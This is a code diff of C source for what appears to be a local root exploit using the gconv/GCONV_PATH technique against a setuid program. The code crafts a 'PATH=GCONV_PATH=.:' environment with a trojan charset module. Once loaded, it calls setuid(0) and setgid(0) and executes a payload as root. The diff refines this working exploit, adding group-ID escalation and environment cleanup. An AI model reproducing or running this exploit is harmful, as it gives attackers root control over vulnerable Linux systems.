@@ -9,38 +9,48 @@
 
 int main(int argc, char **argv, char **envp)
 {
+	char *s;
 	if (argc >= 2 && strcmp(argv[1], MAGIC_PARAM) == 0) {
-		char *s;
-		const char errRoot1[] = "Successfully started by gconv, but no root privileges!\n";
-		const char errRoot2[] = "Failed to set real root ID!\n";
+		const char errRoot[] = "Successfully started by gconv, but no root privileges!\n";
 		if (geteuid() != 0) {
-			write(2, errRoot1, sizeof(errRoot1) - 1);
+			write(2, errRoot, sizeof(errRoot) - 1);
 			return EXIT_FAILURE;
 		}
-		if (setuid(0) == -1) {
-			write(2, errRoot2, sizeof(errRoot2) - 1);
-			return EXIT_FAILURE;
-		}
+		setuid(0);
+		setgid(0);
 		if ((s = getenv(SHELL_SAVE))) {
 			setenv("SHELL", s, 1);
 			unsetenv(SHELL_SAVE);
 		}
-		char *path = strdup(PAYLOAD_PATH);
-		execve(path, (char * const []) {basename(path), NULL}, envp);
+		unsetenv("CHARSET");
+		if ((s = getenv("PATH")) && (s = strchr(s, ':'))) {
+			s++;
+			setenv("PATH", s, 1);
+		}
+		char *payloadPath = strdup(PAYLOAD_PATH);
+		execve(payloadPath, (char * const []) {basename(payloadPath), NULL}, envp);
 	}
 	else {
-		const char varName[] = SHELL_SAVE "=";
-		char *s, *origShell;
+		static const char shellVarName[] = SHELL_SAVE "=";
+		static const char pathVarName[] = "PATH=GCONV_PATH=.:";
+		char *origShell, *path;
 		if ((s = getenv("SHELL"))) {
-			origShell = malloc(sizeof(varName) + strlen(s));
-			strcpy(origShell, varName);
+			origShell = malloc(sizeof(shellVarName) + strlen(s));
+			strcpy(origShell, shellVarName);
 			strcat(origShell, s);
 		} else {
 			origShell = NULL;
 		}
-
+		if ((s = getenv("PATH"))) {
+			path = malloc(sizeof(pathVarName) + strlen(s));
+			strcpy(path, pathVarName);
+			strcat(path, s);
+		} else {
+			path = strdup(pathVarName);
+			path[sizeof(pathVarName) - 2] = '\0';
+		}
 		char *newenviron[] = { strdup(TROJAN_GCONV_PATH),
-			strdup("PATH=GCONV_PATH=.:/usr/bin"),
+			path,
 			strdup("CHARSET=" TROJAN_CHARSET),
 			strdup("SHELL=/does/not/exist"),
 			origShell,
